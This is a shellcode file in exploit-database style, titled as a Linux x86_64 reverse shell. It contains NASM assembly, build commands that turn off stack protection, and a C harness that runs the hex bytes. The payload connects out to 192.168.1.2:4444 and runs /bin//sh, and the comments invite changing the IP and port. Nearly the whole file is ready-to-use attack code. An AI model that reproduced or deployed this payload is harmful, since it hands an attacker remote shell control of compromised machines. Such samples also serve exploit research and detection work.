/*
;Title: Linux/x86_64 - Reverse Shell Shellcode (192.168.1.2:4444)
;Author: Touhid M.Shaikh
;Contact: https://github.com/touhidshaikh
;Category: Shellcode
;Architecture: Linux x86_64
;Description: Reverse Shell, Run nc and listen port  4444.
;Shellcode Length:  153
;Tested on :  Debian 4.9.30-2kali1 (2017-06-22) x86_64 GNU/Linux



===COMPILATION AND EXECUTION Assemmbly file===

#nasm -f elf64 shell.asm -o shell.o <=== Making Object File

#ld shell.o -o shell <=== Making Binary File

#./bin2shell.sh shell <== xtract hex code from the binary(
https://github.com/touhidshaikh/bin2shell)

=================SHELLCODE(INTEL FORMAT)=================

global _start


_start:
xor rax,rax
add rax, 41
xor rdi,rdi
mov rdx, rdi
add rdi, 2
xor rsi,rsi
add rsi, 1
syscall

mov rdi, rax

xor rax, rax
push rax
add rax,0x2
mov dword [rsp-4], 0x0201a8c0       : IP : 192.168.1.2, Change what u
want(Little Endian)
mov word [rsp-6], 0x5c11            ; PORT : 4444, Change what u
want(Little Endian)
mov word [rsp-8], ax
sub rsp, 8
add rax, 40
mov rsi, rsp
xor rdx,rdx
add rdx, 16
syscall
xor rax,rax
mov rsi, rax
add rax, 33
    syscall
    xor rax,rax
    add rax, 33
    xor rsi,rsi
    add rsi, 1
    syscall
    xor rax, rax
    add rax, 33
    xor rsi,rsi
    add rsi, 2
    syscall
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
push rax
    mov rdx, rsp
    push rdi
    mov rsi, rsp
    add rax, 59
    syscall

===================END HERE============================

====================FOR C Compile===========================

Compile with gcc with some options.

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

*/

#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x48\x31\xc0\x48\x83\xc0\x29\x48\x31\xff\x48\x89\xfa\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x48\x83\xc0\x02\xc7\x44\x24\xfc\xc0\xa8\x01\x02\x66\xc7\x44\x24\xfa\x11\x5c\x66\x89\x44\x24\xf8\x48\x83\xec\x08\x48\x83\xc0\x28\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\x48\x89\xc6\x48\x83\xc0\x21\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\x83\xc6\x01\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x48\x83\xc6\x02\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}